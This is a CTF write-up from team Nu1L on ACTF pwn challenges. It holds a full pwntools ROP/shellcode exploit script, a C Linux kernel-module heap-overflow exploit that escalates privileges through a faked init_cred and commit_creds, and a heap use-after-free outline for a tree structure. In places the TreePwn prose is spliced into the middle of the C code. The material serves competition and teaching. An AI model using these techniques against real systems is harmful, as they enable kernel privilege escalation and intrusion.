ACTF WriteUp By Nu1L
ACTF WriteUp By Nu1L
Pwn
kkk
TreePwn
MyKvm
Crypto
RSA LEAK
impossible RSA
Web
poorui
beWhatYouWannaBe
ToLeSion
gogogo
Misc
signin
Mahjoong
safer-telegram-bot-1
BlockChain
AAADAO
bet2loss
Pwn
kkk
通过ROP打通parser执⾏shellcode, 然后把提权的exp编码后发送过去执⾏
kkk.ko漏洞出现在加密时以block为单位进⾏加密, 没考虑不对其的情况, 造成堆溢出.
提权的话将packet对象伪造成init_cred, 然后设置packet→func_ptr = commit_creds然后触发就可以提权, 不⽤关
⼼切回⽤户态的问题
但是怎么泄露内核地址呢? 越界读只能泄露kkk.ko的地址, 也没法ROP, 想了很久, 最终解决⽅法是: 爆破. 因为内核基
地址的熵很⼩, 只有24bit, ⽽且实测发现⼤多数情况都是0x1F800000, 0x21100000这样⽐较⼩的数字, 因此爆破花
不了多⻓时间的.
#! /usr/bin/python2
# coding=utf-8
import sys
from pwn import *
import base64
context.log_level = 'debug'
context(arch='amd64', os='linux')
def Log(name):
    log.success(name+' = '+hex(eval(name)))
def Connect():
    if(len(sys.argv)==1):     #local
        cmd = ["./launch.sh", "1"]
        sh = process(cmd)
    else:           #remtoe
        sh = remote("123.60.41.85", 9999)
        sh.recvuntil('`')
        cmd = sh.recvuntil('`', drop=True)
        print(cmd)
        stamp = os.popen(cmd).read()
        print(stamp)
        sh.send(stamp)
    return sh
sh = Connect()
def Send(cont):
    sh.send(base64.b64encode(cont))
def GDB():
    gdb.attach(sh, '''
    #break *(0x401C0B)
    #break *(0x401CF3)
    break *(0x401D41)
    conti
    ''')
#get pure asm of exp
os.system("gcc -c exp.c -O2 -o exp.o")
os.system("llvm-objcopy-9 --dump-section .text.startup=out ./exp.o")
file = open("out","rb")
code = file.read()
file.close()
rdi = 0x4006a6  # pop rdi; ret;
rsi = 0x402a3c  # pop rsi; ret;
rdx = 0x434162  # pop rdx; ret; 
rax = 0x4005af  # pop rax; ret;
syscall = 0x4859c5 # syscall; ret; 
ret = 0x400416 # ret; 
read_through_base64 = 0x401ABB
def Call(sys, a, b, c):
    rop = flat(rdi, a)
    rop+= flat(rsi, b)
    rop+= flat(rdx, c)
    rop+= flat(rax, sys)
    rop+= flat(syscall)
    return rop
buf = 0x6D8000
while True:
    try:
        def Try():
            for i in range(15):
                sh.recvuntil('ENTER YOUR PACKET > ')
                sh.send('\n')
            # header
            exp = p32(0x0) + p32(0x1)
            exp+= p64(0)
            exp+= p32(0x876) + p32(0)
            exp = exp.ljust(0x30, 'A')
            Send(exp)
            #Segs
            exp = p32(7) + p32(0x0)
            Send(exp)
            #Seg
            for i in range(6):  
                exp = p32(0xdeadbeef) + p32(0x100)
                Send(exp)
                Send(chr(i)*0x100)
            #Seg
            exp = p32(0xdeadbeef)+p32(0xFFFFFF00)
            Send(exp)
            #ROP to read asm of exp by base64
            exp = 'A'*0x218
            exp+= p64(ret)*0x10
            exp+= Call(0xa, buf, 0x8000, 7) # mprotect(buf, 0x8000, 7)
            exp+= flat(rdi, buf, rsi, len(code)+1, read_through_base64)
            exp+= flat(buf)    
            Send(exp)
            sh.send('\n')
            #Send asm of exp
            Send(code)
            sh.send('\n')
            res = sh.recvuntil('ACTF', timeout = 2)
            if 'ACTF' in res:
                print(res)
                return True
            return False
        while True:
            if(Try()):
                break
        sh.interactive()
    except EOFError:
        sh = Connect()
static __inline long syscall(long n, long a1, long a2, long a3)
{
  unsigned long ret;
  long a4 = 0;
  register long r10 __asm__("r10") = a4;
  __asm__ __volatile__ (
    "syscall" 
    :"=a"(ret) 
    : "a"(n), "D"(a1), "S"(a2),
      "d"(a3), "r"(r10)
    : "rcx", "r11", "memory");
  return ret;
}
static __inline int read(int fd, char *buf, int len){
    return syscall(0, fd, buf, len);
}
static __inline int write(int fd, char *buf, int len){
    return syscall(1, fd, buf, len);
}
static __inline int open(char *buf, int mode){
    return syscall(2, buf, mode, 0);
}
static __inline int ioctl(int fd, int cmd, void *arg){
    return syscall(0x10, fd, cmd, arg);
}
struct Param{
    long long opcode;
    long long key_len;
    char *key_buf;
    long long cont_len;
    char *cont_buf;
};
static __inline void Send(int fd, struct Param *p){
    ioctl(fd, 0x6B64, p);
}
static __inline void Show(int fd, struct Param *p){
    ioctl(fd, 0x6B69, p);
}
static __inline void Run(int fd, struct Param *p){
    ioctl(fd, 0x6B6B, p);
}
static __inline void Delete(int fd, struct Param *p){
    ioctl(fd, 0x6B6D, p);
}
static __inline void Update(int fd, struct Param *p){
    ioctl(fd, 0x6B67, p);
}
static __inline memset(char *dst, char c, int len){
    while(len--)
        *dst++ = c;
}
int main(void)
{
    char path[0x10] = "/dev/kkk";
    char buf[0x200];
    char sp[0x20]="================";
    memset(buf, 0, 0x200);
    unsigned long long *ptr = buf;
    struct Param p;
    int fd = open(path, 0);
    // obj0->arr[0] = malloc(0x88)
    p.opcode=0x3;
    p.key_len = 0x71;   //  0xc0-0x30-0x1F
    p.key_buf = buf;
    p.cont_len = 0x1F;
    p.cont_buf = buf+0x80;
    buf[0x0] = 0x41;
    Send(fd, &p);   // packet0
    Send(fd, &p);   // packet1
    Send(fd, &p);   // packet2
    Send(fd, &p);   // packet3
    Send(fd, &p);   // packet4
    Send(fd, &p);   // packet5
    // trigger overflow: packet1->key_len = 0xd8
    p.opcode = 0;
    Run(fd, &p);
    // leak kaslr
    p.opcode = 1;
    p.key_buf = buf;
    p.cont_buf = buf+0x100;
    Show(fd, &p);
    /*
    long long kaslr = ptr[23]-0xffffffffc0000130;  //kkk_aes256_cb()
    write(1, &sp, 8);
    write(1, &kaslr, 8);*/
    unsigned long long heap = ptr[21];
    //write(1, &sp, 8);
    //write(1, &heap, 8);
    // control packet2->key_len
    p.opcode = 1;
    ptr[18] = 0x140; //packet2->key_len
    ptr[20] = 0;     //packet2->cont_len
    p.key_buf = buf;
    p.cont_buf = buf+0x100;
    Update(fd, &p);
    //0xffffffff82850560 D init_cred
    //0xffffffff8109bcf0 T commit_creds
    // prepare packet3
    ptr[18] = 0x4;   //func_ptr = commit_creds(), 
guess
    ptr[18+6] = 0x0;
    ptr[18+7] = 0x0;
    ptr[18+8] = 0x0;
    ptr[18+15] = heap;
    ptr[18+16] = 0;//kaslr+0xffffffff8284ef80;
TreePwn
漏洞: 矩形判断算法有问题, 导致⼀个ele可以插⼊多个⼦树
相关数据结构, 其中
总体如下, 实现了⼀个会⾃⼰分裂平衡的树
漏洞出现在插⼊Element的过程中,
插⼊时, 会把⼀个⼦树中最左下⻆的点与最右上⻆的点组成⼀个矩形, 调⽤ get_min_MBR_added() 计算出, 把
这个点插⼊⼦树的点集中后, ⼦树的矩形的周⻓最⼩变化是多少, 这个值就是 min_MBR_added
然后遍历root中的所有⼦树, 如果发现ele插⼊该⼦树后周⻓变化等于 min_MBR_added 则调
⽤ tree_insert_node() 进⾏插⼊
上述算法过程⼗分的诡异, 最⼤的问题在于插⼊⼀个⼦树后没有及时停⽌, 导致double link. 只要构造两个⼦树, 再插
⼊⼀个点使得两个⼦树周⻓变化相同就可以触发
在树重构时是会按照x与y的⼤⼩排序, 为了简单, 可以把所有的y都设置为0
    ptr[18+17] = 0;//kaslr+0xffffffff8284f020;
    ptr[18+18] = 0;//kaslr+0xffffffff82850e20;
    ptr[18+19] = 0;//kaslr+0xffffffff82850610;
    // control packet3
    p.opcode = 2;
    p.key_buf = buf;
    p.cont_buf = buf;
    Update(fd, &p);
    // trigger packet3->func_ptr()
    write(1, &sp, 0x10);
    p.opcode = 3;
    Run(fd, &p);
    char buf2[0x100] = "/flag\\x00";
    int fd2 = open(buf2, 0);
    read(fd2, buf2, 0x100);
    write(1, buf2, 0x100);
    if(buf2[0]=='A')
        while(1);
    return 0;
}
/*
0xffffffff82fd7366 : mov rdi, qword ptr [rdi + 0x10] ; mov rax, qword ptr [rbx] ; call 
rax
*/
POC如下
之后通过UAF泄露堆地址,
有Edit功能, 因此控制tcache是很容易的, 但是本题只有0x26的对象可控, 因此要泄露libc地址就只能伪造UBchunk了
可以通过UAF劫持tcache, 使其分配到Element0内部, 实现chunk重叠, 将Element当做是UBchunk头部, 从⽽在释放
新分配的对象后读Element0就可以泄露UB地址
在插⼊时会⾸先读⼊Element对象, 如果插⼊时发现点有重复, 则什么也不做, 这是⼀个很好的堆喷原语, 利⽤这个来
伪造Ub chunk后⾯的数据
# [0, 1] [3, 4, 5, 6]
Insert(0, 0, '0'*0x20)
Insert(1, 0, '1'*0x20)
Insert(3, 0, '3'*0x20)
Insert(4, 0, '4'*0x20)
Insert(5, 0, '5'*0x20)
Insert(6, 0, '6'*0x20)
# [0, 1] [3, 4]
Remove(5, 0)
Remove(6, 0)
# double link: [0, 1, 2] [2, 3, 4]
Insert(2, 0, '2'*0x20)
# UAF: [0, 1] [2, 3, 4], Element 2 is freed